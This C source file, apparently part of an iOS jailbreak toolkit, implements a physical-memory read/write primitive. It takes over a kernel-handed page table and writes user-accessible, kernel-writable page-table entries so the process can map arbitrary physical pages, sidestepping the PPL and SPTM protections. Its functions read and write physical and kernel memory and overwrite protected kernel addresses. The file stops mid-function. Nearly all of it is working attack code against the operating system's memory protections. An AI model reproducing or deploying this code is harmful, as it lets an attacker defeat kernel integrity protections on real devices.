#include "primitives.h"
#include "translation.h"
#include "kernel.h"
#include "util.h"
#include "pte.h"
#include "info.h"
#include "physrw_pte_window.h"
#include "physrw_pte.h"
#include "log.h"
#include <errno.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <mach/mach.h>

extern kern_return_t mach_vm_map(vm_map_t target,
                                 mach_vm_address_t *address,
                                 mach_vm_size_t size,
                                 mach_vm_offset_t mask,
                                 int flags,
                                 mem_entry_name_port_t object,
                                 memory_object_offset_t offset,
                                 boolean_t copy,
                                 vm_prot_t currentProtection,
                                 vm_prot_t maximumProtection,
                                 vm_inherit_t inheritance);

#define PRESEED_SENTINEL UINT64_C(0x53454E54494E454C)
#define SPTM_GENERATION_FIRST_ALIAS_SLOT 2U
#define SPTM_GENERATION_SENTINEL_SLOT (L2_BLOCK_COUNT - 1U)
#define SPTM_GENERATION_ALIAS_CAPACITY \
	(SPTM_GENERATION_SENTINEL_SLOT - SPTM_GENERATION_FIRST_ALIAS_SLOT)
#define PHYSRW_PTE_NEEDS_STANDBY (-1000)

typedef struct {
    const char *name;
    size_t firstGroupSlot;
    size_t groupPageCount;
    size_t guardPageCount;
    size_t aliasPageCount;
    size_t groupCount;
} physrw_pte_window_layout;

static const physrw_pte_window_layout gPPLWindowLayout = {
    .name = "ppl-65+63",
    .firstGroupSlot = 64,
    .groupPageCount = 128,
    .guardPageCount = 65,
    .aliasPageCount = PHYSRW_PTE_WINDOW_PAGE_CAPACITY,
    .groupCount = 15,
};

typedef struct {
    uint64_t base;
    uint64_t asidPtr;
    size_t nextSlot;
} physrw_pte_generation;

/*
 * An SPTM generation never reuses a leaf slot. Slot 0 maps the L3 table,
 * slot 1 maps pmap::sw_asid, and the final slot is the sole pmap-owned
 * sentinel. Removing that sentinel after clearing the manual entries lets
 * XNU retire the complete L3 table and issue the 32 MB broadcast range TLBI.
 */

uint8_t *gSwAsid = 0;
static pthread_mutex_t gLock;
static pthread_mutex_t gGenerationLock;
static _Thread_local bool gCreatingSPTMGeneration;
static bool gUsesSPTMGenerations;
static bool gGenerationManagementReady;
static physrw_pte_generation gActiveGeneration;
static physrw_pte_generation gStandbyGeneration;
static size_t gNextReclaimGroup;
static int gPendingReclaimGroup = -1;
static physrw_pte_diagnostics gDiagnostics = {
    .lastReclaimGroup = -1,
};

#define gMagicPTAddress (gActiveGeneration.base)
#define gMagicPT ((uint64_t *)(uintptr_t)gMagicPTAddress)

enum {
    PHYSRW_PTE_RECLAIM_STAGE_NONE,
    PHYSRW_PTE_RECLAIM_STAGE_GUARD_DISABLE,
    PHYSRW_PTE_RECLAIM_STAGE_GUARD_ENABLE,
    PHYSRW_PTE_RECLAIM_STAGE_GENERATION_SENTINEL,
    PHYSRW_PTE_RECLAIM_STAGE_GENERATION_RESERVATION,
};

static void physrw_pte_record_reclaim_failure(int32_t group, int status, kern_return_t machStatus, uint32_t stage) {
    gDiagnostics.reclaimFailures++;
    gDiagnostics.lastReclaimGroup = group;
    gDiagnostics.lastReclaimStatus = status;
    gDiagnostics.lastReclaimMachStatus = machStatus;
    gDiagnostics.lastReclaimStage = stage;
}

static void physrw_pte_record_acquire_failure(uint64_t pa) {
    gDiagnostics.acquireFailures++;
    gDiagnostics.lastFailedPhysicalAddress = pa;
}

static bool physrw_pte_layout_is_valid(const physrw_pte_window_layout *layout) {
    size_t lastGroupEnd = layout->firstGroupSlot + layout->groupCount * layout->groupPageCount;
    return layout->aliasPageCount != 0 && layout->guardPageCount != 0
        && layout->guardPageCount + layout->aliasPageCount == layout->groupPageCount && lastGroupEnd < L2_BLOCK_COUNT;
}

static bool physrw_pte_sptm_generation_geometry_is_valid(void) {
    return vm_real_kernel_page_size == 0x4000 && L2_BLOCK_COUNT == 0x800
        && SPTM_GENERATION_FIRST_ALIAS_SLOT < SPTM_GENERATION_SENTINEL_SLOT
        && SPTM_GENERATION_ALIAS_CAPACITY >= PHYSRW_PTE_WINDOW_PAGE_CAPACITY;
}

static int physrw_pte_configure_window_mode(void) {
    gUsesSPTMGenerations = system_info_uses_sptm();
    if (gUsesSPTMGenerations) {
        return physrw_pte_sptm_generation_geometry_is_valid() ? 0 : EINVAL;
    }
    return physrw_pte_layout_is_valid(&gPPLWindowLayout)
            && gPPLWindowLayout.aliasPageCount == PHYSRW_PTE_WINDOW_PAGE_CAPACITY
        ? 0
        : EINVAL;
}

static uint64_t physrw_pte_layout_group_first_slot(const physrw_pte_window_layout *layout, size_t group) {
    return layout->firstGroupSlot + group * layout->groupPageCount;
}

static uint64_t physrw_pte_layout_group_first_alias_slot(const physrw_pte_window_layout *layout, size_t group) {
    return physrw_pte_layout_group_first_slot(layout, group) + layout->guardPageCount;
}

static uint64_t physrw_pte_group_first_slot(size_t group) {
    return physrw_pte_layout_group_first_slot(&gPPLWindowLayout, group);
}

static uint64_t physrw_pte_group_first_alias_slot(size_t group) {
    return physrw_pte_layout_group_first_alias_slot(&gPPLWindowLayout, group);
}

static int physrw_pte_restore_guard_range(size_t group, kern_return_t *machStatusOut, uint32_t *stageOut) {
    vm_address_t address = gMagicPTAddress + physrw_pte_group_first_slot(group) * vm_real_kernel_page_size;
    vm_size_t size = gPPLWindowLayout.guardPageCount * vm_real_kernel_page_size;
    kern_return_t kr = vm_protect(mach_task_self(), address, size, false, VM_PROT_NONE);
    if (kr != KERN_SUCCESS) {
        *machStatusOut = kr;
        *stageOut = PHYSRW_PTE_RECLAIM_STAGE_GUARD_DISABLE;
        return EIO;
    }

    kr = vm_protect(mach_task_self(), address, size, false, VM_PROT_READ | VM_PROT_WRITE);
    if (kr != KERN_SUCCESS) {
        *machStatusOut = kr;
        *stageOut = PHYSRW_PTE_RECLAIM_STAGE_GUARD_ENABLE;
        return EIO;
    }

    for (vm_size_t offset = 0; offset < size; offset += vm_real_kernel_page_size) {
        *(volatile uint8_t *)(uintptr_t)(address + offset) = 0;
    }
    __asm__ volatile("dsb sy\nisb" ::: "memory");
    return 0;
}

static int physrw_pte_reclaim_group(size_t group) {
    gDiagnostics.reclaimAttempts++;
    uint64_t firstAlias = physrw_pte_group_first_alias_slot(group);
    for (uint64_t offset = 0; offset < gPPLWindowLayout.aliasPageCount; offset++) {
        gMagicPT[firstAlias + offset] = 0;
    }
    __asm__ volatile("dsb ishst" ::: "memory");

    kern_return_t machStatus = KERN_SUCCESS;
    uint32_t stage = PHYSRW_PTE_RECLAIM_STAGE_NONE;
    int status = physrw_pte_restore_guard_range(group, &machStatus, &stage);
    if (status != 0) {
        gPendingReclaimGroup = (int)group;
        physrw_pte_record_reclaim_failure(group, status, machStatus, stage);
        return status;
    }
    gDiagnostics.reclaimSuccesses++;
    gPendingReclaimGroup = -1;
    gNextReclaimGroup = (group + 1) % gPPLWindowLayout.groupCount;
    return 0;
}

static uint64_t physrw_pte_alias_attributes(void) {
    return PERM_TO_PTE(PERM_KRW_URW) | PTE_NON_GLOBAL | PTE_OUTER_SHAREABLE | PTE_LEVEL3_ENTRY;
}

static int physrw_pte_retire_generation(physrw_pte_generation generation,
                                        kern_return_t *machStatusOut,
                                        uint32_t *stageOut) {
    if (!generation.base)
        return EINVAL;

    uint64_t *table = (uint64_t *)(uintptr_t)generation.base;
    for (size_t slot = SPTM_GENERATION_FIRST_ALIAS_SLOT; slot < SPTM_GENERATION_SENTINEL_SLOT; slot++) {
        table[slot] = 0;
    }
    table[1] = 0;
    __asm__ volatile("dsb ishst" ::: "memory");
    table[0] = 0;
    __asm__ volatile("dsb sy\nisb" ::: "memory");

    vm_address_t sentinel = generation.base + SPTM_GENERATION_SENTINEL_SLOT * vm_real_kernel_page_size;
    kern_return_t kr = vm_deallocate(mach_task_self(), sentinel, vm_real_kernel_page_size);
    if (kr != KERN_SUCCESS) {
        *machStatusOut = kr;
        *stageOut = PHYSRW_PTE_RECLAIM_STAGE_GENERATION_SENTINEL;
        return EIO;
    }

    kr = vm_deallocate(mach_task_self(), generation.base, SPTM_GENERATION_SENTINEL_SLOT * vm_real_kernel_page_size);
    if (kr != KERN_SUCCESS) {
        *machStatusOut = kr;
        *stageOut = PHYSRW_PTE_RECLAIM_STAGE_GENERATION_RESERVATION;
        return EIO;
    }
    return 0;
}

static bool physrw_pte_generation_is_pristine(physrw_pte_generation generation) {
    if (!generation.base || (generation.base & L2_BLOCK_MASK) != 0
        || (generation.asidPtr & ~vm_real_kernel_page_mask) - vm_real_kernel_page_size != generation.base) {
        return false;
    }

    uint64_t *table = (uint64_t *)(uintptr_t)generation.base;
    if (!(table[0] & ARM_TTE_VALID) || !(table[1] & ARM_TTE_VALID)
        || !(table[SPTM_GENERATION_SENTINEL_SLOT] & ARM_TTE_VALID)) {
        return false;
    }
    for (size_t slot = SPTM_GENERATION_FIRST_ALIAS_SLOT; slot < SPTM_GENERATION_SENTINEL_SLOT; slot++) {
        if (table[slot] != 0)
            return false;
    }
    return true;
}

static int physrw_pte_rotate_generation_locked(void) {
    if (!gStandbyGeneration.base)
        return PHYSRW_PTE_NEEDS_STANDBY;

    physrw_pte_generation retiring = gActiveGeneration;
    gActiveGeneration = gStandbyGeneration;
    gStandbyGeneration = (physrw_pte_generation){0};
    gSwAsid = (void *)(uintptr_t)gActiveGeneration.asidPtr;
    gDiagnostics.generationRotations++;
    gDiagnostics.reclaimAttempts++;

    kern_return_t machStatus = KERN_SUCCESS;
    uint32_t stage = PHYSRW_PTE_RECLAIM_STAGE_NONE;
    int status = physrw_pte_retire_generation(retiring, &machStatus, &stage);
    if (status == 0) {
        gDiagnostics.reclaimSuccesses++;
        return 0;
    }

    gDiagnostics.generationRetirementFailures++;
    physrw_pte_record_reclaim_failure(-1, status, machStatus, stage);
    /*
	 * The new active generation is already independent. Leave the failed
	 * retiring reservation allocated so its virtual address cannot be reused
	 * without a confirmed full-table shootdown.
	 */
    return 0;
}

static uint64_t physrw_pte_find_generation_sequence_locked(const uint64_t *pageAddresses, size_t pageCount) {
    if (gActiveGeneration.nextSlot < SPTM_GENERATION_FIRST_ALIAS_SLOT + pageCount) {
        return 0;
    }

    size_t lastStart = gActiveGeneration.nextSlot - pageCount;
    for (size_t start = SPTM_GENERATION_FIRST_ALIAS_SLOT; start <= lastStart; start++) {
        bool matches = true;
        for (size_t pageIndex = 0; pageIndex < pageCount; pageIndex++) {
            uint64_t entry = gMagicPT[start + pageIndex];
            if (!(entry & ARM_TTE_VALID) || (entry & ARM_TTE_PA_MASK) != pageAddresses[pageIndex]) {
                matches = false;
                break;
            }
        }
        if (matches)
            return start;
    }
    return 0;
}

static int physrw_pte_map_generation_pages_locked(const uint64_t *pageAddresses,
                                                  size_t pageCount,
                                                  uint64_t *firstSlotOut,
                                                  bool *rotatedOut) {
    uint64_t firstSlot = physrw_pte_find_generation_sequence_locked(pageAddresses, pageCount);
    if (firstSlot != 0) {
        gDiagnostics.cacheHits += pageCount;
        *firstSlotOut = firstSlot;
        *rotatedOut = false;
        return 0;
    }

    bool rotated = false;
    if (gActiveGeneration.nextSlot + pageCount > SPTM_GENERATION_SENTINEL_SLOT) {
        int status = physrw_pte_rotate_generation_locked();
        if (status != 0)
            return status;
        rotated = true;
    }

    firstSlot = gActiveGeneration.nextSlot;
    uint64_t attributes = physrw_pte_alias_attributes();
    for (size_t pageIndex = 0; pageIndex < pageCount; pageIndex++) {
        gMagicPT[firstSlot + pageIndex] = pageAddresses[pageIndex] | attributes;
    }
    gActiveGeneration.nextSlot += pageCount;
    __asm__ volatile("dsb ishst\nisb" ::: "memory");

    if (rotated) {
        gDiagnostics.reclaimedSlotAssignments += pageCount;
    } else {
        gDiagnostics.freshSlotAssignments += pageCount;
    }
    *firstSlotOut = firstSlot;
    *rotatedOut = rotated;
    return 0;
}

static int physrw_pte_create_generation(physrw_pte_generation *generationOut) {
    uint64_t base = 0;
    int status = physrw_pte_preseed(&base);
    if (status != 0)
        return status;

    uint64_t asidPtr = 0;
    status = physrw_pte_handoff(getpid(), base, &asidPtr);
    if (status != 0) {
        vm_deallocate(mach_task_self(), base, L2_BLOCK_SIZE);
        return status;
    }

    physrw_pte_generation generation = {
        .base = base,
        .asidPtr = asidPtr,
        .nextSlot = SPTM_GENERATION_FIRST_ALIAS_SLOT,
    };
    if (!physrw_pte_generation_is_pristine(generation)) {
        kern_return_t machStatus = KERN_SUCCESS;
        uint32_t stage = PHYSRW_PTE_RECLAIM_STAGE_NONE;
        (void)physrw_pte_retire_generation(generation, &machStatus, &stage);
        return EPROTO;
    }

    *generationOut = generation;
    return 0;
}

static int physrw_pte_replenish_standby_generation(void) {
    if (!gUsesSPTMGenerations)
        return 0;

    int generationLockStatus = pthread_mutex_lock(&gGenerationLock);
    if (generationLockStatus != 0)
        return generationLockStatus;

    int lockStatus = pthread_mutex_lock(&gLock);
    if (lockStatus != 0) {
        pthread_mutex_unlock(&gGenerationLock);
        return lockStatus;
    }
    if (gStandbyGeneration.base) {
        pthread_mutex_unlock(&gLock);
        return pthread_mutex_unlock(&gGenerationLock);
    }
    gDiagnostics.generationBuildAttempts++;
    pthread_mutex_unlock(&gLock);

    physrw_pte_generation standby = {0};
    gCreatingSPTMGeneration = true;
    int status = physrw_pte_create_generation(&standby);
    gCreatingSPTMGeneration = false;

    lockStatus = pthread_mutex_lock(&gLock);
    if (lockStatus != 0) {
        if (status == 0) {
            kern_return_t machStatus = KERN_SUCCESS;
            uint32_t stage = PHYSRW_PTE_RECLAIM_STAGE_NONE;
            (void)physrw_pte_retire_generation(standby, &machStatus, &stage);
        }
        pthread_mutex_unlock(&gGenerationLock);
        return lockStatus;
    }
    if (status == 0) {
        gStandbyGeneration = standby;
    } else {
        gDiagnostics.generationBuildFailures++;
    }
    pthread_mutex_unlock(&gLock);
    if (status != 0) {
        JBLogError("physrw PTE standby generation build failed status=%d", status);
    }

    int unlockStatus = pthread_mutex_unlock(&gGenerationLock);
    return status != 0 ? status : unlockStatus;
}

int physrw_pte_prepare_standby_generation(void) {
    int status = physrw_pte_replenish_standby_generation();
    if (status != 0 || !gUsesSPTMGenerations)
        return status;

    int lockStatus = pthread_mutex_lock(&gLock);
    if (lockStatus != 0)
        return lockStatus;
    gGenerationManagementReady = true;
    return pthread_mutex_unlock(&gLock);
}

static int physrw_pte_access_sptm_generation(const uint64_t *pageAddresses,
                                             const physrw_pte_window_range *range,
                                             kernel_map_accessor accessorBlock) {
    if (!gCreatingSPTMGeneration) {
        int lockStatus = pthread_mutex_lock(&gLock);
        if (lockStatus != 0)
            return lockStatus;
        bool shouldBuildStandby = gGenerationManagementReady && !gStandbyGeneration.base;
        pthread_mutex_unlock(&gLock);
        if (shouldBuildStandby) {
            /*
			 * Replenishment is proactive here. A transient build failure must
			 * not reject an access that still fits in the active generation;
			 * the rotation path below retries and owns the hard failure.
			 */
            (void)physrw_pte_replenish_standby_generation();
        }
    }

    for (;;) {
        int lockStatus = pthread_mutex_lock(&gLock);
        if (lockStatus != 0)
            return lockStatus;

        uint64_t firstSlot = 0;
        bool rotated = false;
        bool generationManagementReady = gGenerationManagementReady;
        int status = physrw_pte_map_generation_pages_locked(pageAddresses, range->pageCount, &firstSlot, &rotated);
        if (status == PHYSRW_PTE_NEEDS_STANDBY) {
            pthread_mutex_unlock(&gLock);
            if (gCreatingSPTMGeneration || !generationManagementReady) {
                return ENOSPC;
            }
            status = physrw_pte_replenish_standby_generation();
            if (status == 0)
                continue;
            lockStatus = pthread_mutex_lock(&gLock);
            if (lockStatus == 0) {
                physrw_pte_record_acquire_failure(pageAddresses[0]);
                pthread_mutex_unlock(&gLock);
            }
            return status;
        }
        if (status != 0) {
            physrw_pte_record_acquire_failure(pageAddresses[0]);
            pthread_mutex_unlock(&gLock);
            return status;
        }

        accessorBlock((void *)(gMagicPTAddress + firstSlot * vm_real_kernel_page_size + range->firstPageOffset));
        int unlockStatus = pthread_mutex_unlock(&gLock);
        if (unlockStatus != 0)
            return unlockStatus;

        if (rotated) {
            (void)physrw_pte_replenish_standby_generation();
        }
        return 0;
    }
}

static int physrw_pte_access_ppl_page(uint64_t pa, kernel_map_accessor accessorBlock) {
    int lockStatus = pthread_mutex_lock(&gLock);
    if (lockStatus != 0)
        return lockStatus;

    uint64_t toUse = 0;
    bool usedExistingSlot = false;
    bool usedReclaimedSlot = false;

    // Find existing
    for (size_t group = 0; group < gPPLWindowLayout.groupCount; group++) {
        uint64_t firstAlias = physrw_pte_group_first_alias_slot(group);
        for (uint64_t offset = 0; offset < gPPLWindowLayout.aliasPageCount; offset++) {
            uint64_t slot = firstAlias + offset;
            uint64_t entry = gMagicPT[slot];
            if ((entry & ARM_TTE_VALID) && (entry & ARM_TTE_PA_MASK) == pa) {
                toUse = slot;
                usedExistingSlot = true;
                break;
            }
        }
        if (toUse != 0)
            break;
    }

    if (toUse == 0 && gPendingReclaimGroup >= 0) {
        int status = physrw_pte_reclaim_group((size_t)gPendingReclaimGroup);
        if (status != 0) {
            physrw_pte_record_acquire_failure(pa);
            pthread_mutex_unlock(&gLock);
            return status;
        }
        usedReclaimedSlot = true;
    }

    // If not found, find an alias slot that has never held a translation
    // since its group's last completed shootdown.
    if (toUse == 0) {
        for (size_t group = 0; group < gPPLWindowLayout.groupCount; group++) {
            uint64_t firstAlias = physrw_pte_group_first_alias_slot(group);
            for (uint64_t offset = 0; offset < gPPLWindowLayout.aliasPageCount; offset++) {
                uint64_t slot = firstAlias + offset;
                if (!gMagicPT[slot]) {
                    toUse = slot;
                    break;
                }
            }
            if (toUse != 0)
                break;
        }
    }

    // PPL rounds the 65-page official unmap to the adjacent 63 aliases.
    if (toUse == 0) {
        size_t group = gNextReclaimGroup;
        int status = physrw_pte_reclaim_group(group);
        if (status != 0) {
            physrw_pte_record_acquire_failure(pa);
            pthread_mutex_unlock(&gLock);
            return status;
        }
        toUse = physrw_pte_group_first_alias_slot(group);
        usedReclaimedSlot = true;
    }

    if (usedExistingSlot) {
        gDiagnostics.cacheHits++;
    } else if (usedReclaimedSlot) {
        gDiagnostics.reclaimedSlotAssignments++;
    } else {
        gDiagnostics.freshSlotAssignments++;
    }

    gMagicPT[toUse] = pa | physrw_pte_alias_attributes();
    __asm__ volatile("dsb ishst\nisb" ::: "memory");

    accessorBlock((void *)(gMagicPTAddress + (toUse * vm_real_kernel_page_size)));

    int unlockStatus = pthread_mutex_unlock(&gLock);
    if (unlockStatus != 0) {
        physrw_pte_record_acquire_failure(pa);
    }
    return unlockStatus;
}

static int acquire_window(uint64_t pa, void (^block)(void *ua)) {
    if (!block || (pa & vm_real_kernel_page_mask) != 0)
        return EINVAL;
    if (!gUsesSPTMGenerations) {
        return physrw_pte_access_ppl_page(pa, block);
    }

    physrw_pte_window_range range = {
        .firstPageAddress = pa,
        .pageCount = 1,
    };
    return physrw_pte_access_sptm_generation(&pa, &range, block);
}

int physrw_pte_copy_diagnostics(physrw_pte_diagnostics *diagnosticsOut) {
    if (!diagnosticsOut)
        return EINVAL;
    if (!gMagicPTAddress)
        return ENOTSUP;

    int lockStatus = pthread_mutex_lock(&gLock);
    if (lockStatus != 0)
        return lockStatus;
    *diagnosticsOut = gDiagnostics;
    if (gUsesSPTMGenerations) {
        diagnosticsOut->activeGenerationSlotsUsed = gActiveGeneration.nextSlot - SPTM_GENERATION_FIRST_ALIAS_SLOT;
        diagnosticsOut->activeGenerationCapacity = SPTM_GENERATION_ALIAS_CAPACITY;
        diagnosticsOut->standbyGenerationReady = gStandbyGeneration.base != 0;
    }
    int unlockStatus = pthread_mutex_unlock(&gLock);
    return unlockStatus;
}

static int physrw_pte_access_scattered(const uint64_t *pageAddresses,
                                       const physrw_pte_window_range *range,
                                       kernel_map_accessor accessorBlock) {
    if (!pageAddresses || !range || !accessorBlock || range->pageCount == 0
        || range->pageCount > PHYSRW_PTE_WINDOW_PAGE_CAPACITY) {
        return EINVAL;
    }

    uint64_t pageMask = vm_real_kernel_page_mask;
    for (size_t pageIndex = 0; pageIndex < range->pageCount; pageIndex++) {
        if ((pageAddresses[pageIndex] & pageMask) != 0)
            return EINVAL;
    }
    if (gUsesSPTMGenerations) {
        return physrw_pte_access_sptm_generation(pageAddresses, range, accessorBlock);
    }

    int lockStatus = pthread_mutex_lock(&gLock);
    if (lockStatus != 0)
        return lockStatus;

    size_t group = gPendingReclaimGroup >= 0 ? (size_t)gPendingReclaimGroup : gNextReclaimGroup;
    int status = physrw_pte_reclaim_group(group);
    if (status != 0) {
        pthread_mutex_unlock(&gLock);
        return status;
    }
    uint64_t firstAlias = physrw_pte_group_first_alias_slot(group);

    uint64_t attributes = physrw_pte_alias_attributes();
    for (size_t pageIndex = 0; pageIndex < range->pageCount; pageIndex++) {
        gMagicPT[firstAlias + pageIndex] = pageAddresses[pageIndex] | attributes;
    }
    __asm__ volatile("dsb ishst\nisb" ::: "memory");

    accessorBlock((void *)(gMagicPTAddress + (firstAlias * vm_real_kernel_page_size) + range->firstPageOffset));

    int unlockStatus = pthread_mutex_unlock(&gLock);
    return unlockStatus;
}

int physrw_pte_physreadbuf(uint64_t pa, void *output, size_t size) {
    __block int r = 0;
    enumerate_pages(pa, size, vm_real_kernel_page_size, ^bool(uint64_t curPA, size_t curSize) {
        r = acquire_window(curPA & ~vm_real_kernel_page_mask, ^(void *ua) {
            void *curUA = ((uint8_t *)ua) + (curPA & vm_real_kernel_page_mask);
            memcpy(&output[curPA - pa], curUA, curSize);
            __asm("dmb sy");
        });
        return r == 0;
    });
    return r;
}

int physrw_pte_physwritebuf(uint64_t pa, const void *input, size_t size) {
    __block int r = 0;
    enumerate_pages(pa, size, vm_real_kernel_page_size, ^bool(uint64_t curPA, size_t curSize) {
        r = acquire_window(curPA & ~vm_real_kernel_page_mask, ^(void *ua) {
            void *curUA = ((uint8_t *)ua) + (curPA & vm_real_kernel_page_mask);
            memcpy(curUA, &input[curPA - pa], curSize);
            __asm("dmb sy");
        });
        return r == 0;
    });
    return r;
}

int physrw_pte_physaccess_mapped(uint64_t pa, uint64_t size, kernel_map_accessor accessorBlock) {
    if (!accessorBlock)
        return EINVAL;

    physrw_pte_window_range range = {0};
    int status = physrw_pte_window_range_make(pa,
                                              size,
                                              vm_real_kernel_page_size,
                                              PHYSRW_PTE_WINDOW_PAGE_CAPACITY,
                                              &range);
    if (status != 0)
        return status;

    if (range.pageCount == 1) {
        return acquire_window(range.firstPageAddress, ^(void *ua) {
            accessorBlock((void *)((uintptr_t)ua + range.firstPageOffset));
        });
    }

    uint64_t *pageAddresses = calloc(range.pageCount, sizeof(*pageAddresses));
    if (!pageAddresses)
        return ENOMEM;
    for (size_t pageIndex = 0; pageIndex < range.pageCount; pageIndex++) {
        pageAddresses[pageIndex] = range.firstPageAddress + (pageIndex * vm_real_kernel_page_size);
    }

    status = physrw_pte_access_scattered(pageAddresses, &range, accessorBlock);
    free(pageAddresses);
    return status;
}

static int physrw_pte_kaccess_mapped(uint64_t va, uint64_t size, kernel_map_accessor accessorBlock) {
    if (!accessorBlock)
        return EINVAL;

    physrw_pte_window_range range = {0};
    int status = physrw_pte_window_range_make(va,
                                              size,
                                              vm_real_kernel_page_size,
                                              PHYSRW_PTE_WINDOW_PAGE_CAPACITY,
                                              &range);
    if (status != 0)
        return status;

    if (range.pageCount == 1) {
        errno = 0;
        uint64_t pa = kvtophys(va);
        if (!pa)
            return errno ?: ENXIO;
        return physrw_pte_physaccess_mapped(pa, size, accessorBlock);
    }

    uint64_t *pageAddresses = calloc(range.pageCount, sizeof(*pageAddresses));
    if (!pageAddresses)
        return ENOMEM;

    /* Resolve before taking gLock: page-table walks use this same PTE window. */
    for (size_t pageIndex = 0; pageIndex < range.pageCount; pageIndex++) {
        uint64_t pageVA = range.firstPageAddress + (pageIndex * vm_real_kernel_page_size);
        errno = 0;
        uint64_t pagePA = kvtophys(pageVA);
        if (!pagePA) {
            status = errno ?: ENXIO;
            free(pageAddresses);
            return status;
        }
        if ((pagePA & vm_real_kernel_page_mask) != 0) {
            free(pageAddresses);
            return EPROTO;
        }
        pageAddresses[pageIndex] = pagePA;
    }

    status = physrw_pte_access_scattered(pageAddresses, &range, accessorBlock);
    free(pageAddresses);
    return status;
}

static int physrw_pte_write_protected64(uint64_t kaddr, uint64_t value) {
    if ((kaddr & (sizeof(uint64_t) - 1)) != 0) {
        return -1;
    }

    uint64_t original = 0;
    int readStatus = gPrimitives.protectedKwrite32 ? kreadbuf(kaddr, &original, sizeof(original))
                                                   : kreadbuf_protected(kaddr, &original, sizeof(original));
    if (readStatus != 0)
        return -2;

    if (!gPrimitives.protectedKwrite32) {
        int writeStatus = kwritebuf_protected(kaddr, &value, sizeof(value));
        if (writeStatus != 0)
            return writeStatus;

        uint64_t observed = 0;
        readStatus = kreadbuf_protected(kaddr, &observed, sizeof(observed));
        if (readStatus == 0 && observed == value)
            return 0;

        int rollbackStatus = kwritebuf_protected(kaddr, &original, sizeof(original));
        return rollbackStatus != 0 ? -7 : (readStatus != 0 ? readStatus : -6);
    }

    uint32_t originalLow = (uint32_t)original;
    uint32_t originalHigh = (uint32_t)(original >> 32);
    uint32_t valueLow = (uint32_t)value;
    uint32_t valueHigh = (uint32_t)(value >> 32);

    if (originalLow != valueLow && gPrimitives.protectedKwrite32(kaddr, valueLow) != 0) {
        return -3;
    }
    if (originalHigh != valueHigh && gPrimitives.protectedKwrite32(kaddr + sizeof(uint32_t), valueHigh) != 0) {
        if (originalLow != valueLow) {
            gPrimitives.protectedKwrite32(kaddr, originalLow);
        }
        return -4;
    }

    uint64_t observed = 0;
    if (kreadbuf(kaddr, &observed, sizeof(observed)) != 0 || observed != value) {
        gPrimitives.protectedKwrite32(kaddr, originalLow);
        gPrimitives.protectedKwrite32(kaddr + sizeof(uint32_t), originalHigh);
        return -5;
    }
    return 0;
}

static int physrw_pte_preseed_guard_ranges(vm_address_t base) {
    vm_size_t guardSize = gPPLWindowLayout.guardPageCount * vm_real_kernel_page_size;
    vm_address_t backing = 0;
    kern_return_t kr = vm_allocate(mach_task_self(), &backing, guardSize, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS)
        return -1;

    for (vm_size_t offset = 0; offset < guardSize; offset += vm_real_kernel_page_size) {
        *(volatile uint8_t *)(uintptr_t)(backing + offset) = 0;
    }

    memory_object_size_t memoryEntrySize = guardSize;
    mem_entry_name_port_t memoryEntry = MACH_PORT_NULL;
    kr = mach_make_memory_entry_64(mach_task_self(),
                                   &memoryEntrySize,
                                   backing,
                                   VM_PROT_READ | VM_PROT_WRITE,
                                   &memoryEntry,
                                   MACH_PORT_NULL);
    if (kr != KERN_SUCCESS || memoryEntrySize < guardSize) {
        vm_deallocate(mach_task_self(), backing, guardSize);
        return -2;
    }

    int status = 0;
    for (size_t group = 0; group < gPPLWindowLayout.groupCount; group++) {
        mach_vm_address_t expectedAddress = base + physrw_pte_group_first_slot(group) * vm_real_kernel_page_size;
        mach_vm_address_t mappedAddress = expectedAddress;
        kr = mach_vm_map(mach_task_self(),
                         &mappedAddress,
                         guardSize,
                         0,
                         VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                         memoryEntry,
                         0,
                         false,
                         VM_PROT_READ | VM_PROT_WRITE,
                         VM_PROT_READ | VM_PROT_WRITE,
                         VM_INHERIT_NONE);
        if (kr != KERN_SUCCESS || mappedAddress != expectedAddress) {
            status = -3;
            break;
        }

        for (vm_size_t offset = 0; offset < guardSize; offset += vm_real_kernel_page_size) {
            (void)*(volatile uint8_t *)(uintptr_t)(mappedAddress + offset);
        }
    }

    vm_deallocate(mach_task_self(), backing, guardSize);
    mach_port_deallocate(mach_task_self(), memoryEntry);
    __asm__ volatile("dsb sy" ::: "memory");
    return status;
}

int physrw_pte_preseed(uint64_t *pageTableVirtualAddressOut) {
    if (!pageTableVirtualAddressOut)
        return -1;
    bool usesSPTMGenerations = system_info_uses_sptm();
    if ((usesSPTMGenerations && !physrw_pte_sptm_generation_geometry_is_valid())
        || (!usesSPTMGenerations && !physrw_pte_layout_is_valid(&gPPLWindowLayout))) {
        return -1;
    }

    vm_address_t reservation = 0;
    vm_size_t reservationSize = 2 * L2_BLOCK_SIZE;
    kern_return_t kr = vm_allocate(mach_task_self(), &reservation, reservationSize, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS)
        return -2;

    vm_address_t base = (reservation + L2_BLOCK_SIZE - 1) & ~L2_BLOCK_MASK;
    vm_address_t end = reservation + reservationSize;
    if (base > reservation) {
        kr = vm_deallocate(mach_task_self(), reservation, base - reservation);
        if (kr != KERN_SUCCESS) {
            vm_deallocate(mach_task_self(), reservation, reservationSize);
            return -3;
        }
    }
    if (base + L2_BLOCK_SIZE < end) {
        kr = vm_deallocate(mach_task_self(), base + L2_BLOCK_SIZE, end - base - L2_BLOCK_SIZE);
        if (kr != KERN_SUCCESS) {
            vm_deallocate(mach_task_self(), base, end - base);
            return -4;
        }
    }

    vm_address_t sentinel = base + (L2_BLOCK_COUNT - 1) * vm_real_kernel_page_size;
    kr = vm_protect(mach_task_self(), base, sentinel - base, false, VM_PROT_NONE);
    if (kr != KERN_SUCCESS) {
        vm_deallocate(mach_task_self(), base, L2_BLOCK_SIZE);
        return -5;
    }
    if (!usesSPTMGenerations) {
        int preseedStatus = physrw_pte_preseed_guard_ranges(base);
        if (preseedStatus != 0) {
            vm_deallocate(mach_task_self(), base, L2_BLOCK_SIZE);
            return -6;
        }
    }

    *(volatile uint64_t *)(uintptr_t)sentinel = PRESEED_SENTINEL;
    __asm__ volatile("dsb ishst" ::: "memory");

    *pageTableVirtualAddressOut = base;
    const char *layoutName = usesSPTMGenerations ? "sptm-generation" : gPPLWindowLayout.name;
    size_t aliasCapacity = usesSPTMGenerations ? SPTM_GENERATION_ALIAS_CAPACITY
                                               : gPPLWindowLayout.groupCount * gPPLWindowLayout.aliasPageCount;
